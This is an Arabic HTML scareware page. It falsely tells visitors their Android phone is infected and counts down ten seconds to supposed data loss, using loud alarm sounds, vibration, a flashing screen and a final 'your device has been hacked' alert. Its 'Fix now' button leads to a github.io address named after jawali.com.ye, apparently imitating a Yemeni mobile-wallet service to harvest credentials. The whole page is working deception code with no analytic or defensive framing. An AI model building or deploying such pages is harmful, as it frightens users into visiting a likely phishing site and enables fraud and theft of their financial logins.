<!DOCTYPE html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ تنبيه الفيروسات ⚠️</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      html, body {
        height: 100%;
        width: 100%;
        background-color: black;
        color: red;
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        text-align: center;
        overflow: hidden;
      }

      h1 {
        font-size: 7vw;
        margin-bottom: 20px;
      }

      p {
        font-size: 5vw;
        margin: 10px 0;
      }

      #countdown {
        font-size: 6vw;
        font-weight: bold;
      }

      button {
        margin-top: 30px;
        padding: 15px 30px;
        font-size: 5vw;
        cursor: pointer;
        background-color: red;
        color: white;
        border: none;
        border-radius: 10px;
        animation: pulse 1s infinite;
      }

      .flash {
        animation: flash-bg 0.2s infinite alternate;
      }

      @keyframes flash-bg {
        from { background-color: red; }
        to { background-color: white; color: black; }
      }

      @keyframes pulse {
        0% { transform: scale(1); }
        50% { transform: scale(1.1); }
        100% { transform: scale(1); }
      }
    </style>
  </head>
  <body>
    <h1>⚠️ تنبيه أمني خطير ⚠️</h1>
    <p>جهاز Android الخاص بك مصاب!</p>
    <p>إذا لم يتم إصلاحه في <span id="countdown">10</span> ثانية، ستفقد بياناتك!</p>

    <button onclick="window.location.href='https://sn4a5s6h.github.io/jawali.com.ye/'">إصلاح الآن</button>

    <!-- صوت إنذار أول -->
    <audio id="alarm-sound">
      <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg">
    </audio>

    <!-- صوت صدمة نهائية -->
    <audio id="final-sound">
      <source src="https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg" type="audio/ogg">
    </audio>

    <script>
      let timeLeft = 10;
      const countdownEl = document.getElementById("countdown");
      const alarmSound = document.getElementById("alarm-sound");
      const finalSound = document.getElementById("final-sound");
      const body = document.body;

      // رفع مستوى الصوت إلى 100%
      alarmSound.volume = 1.0;
      finalSound.volume = 1.0;

      const timer = setInterval(() => {
        timeLeft--;
        countdownEl.textContent = timeLeft;

        if (timeLeft === 8) {
          alarmSound.play();
        }

        if (timeLeft === 7 && navigator.vibrate) {
          navigator.vibrate([500, 200, 500]);
        }

        if (timeLeft <= 0) {
          clearInterval(timer);
          countdownEl.textContent = "0";
          finalSound.play();
          body.classList.add("flash");

          if (navigator.vibrate) {
            navigator.vibrate([300, 100, 300, 100, 300]);
          }

          setTimeout(() => {
            alert("تم اختراق جهازك");
          }, 1500);
        }
      }, 1000);
    </script>
  </body>
</html>
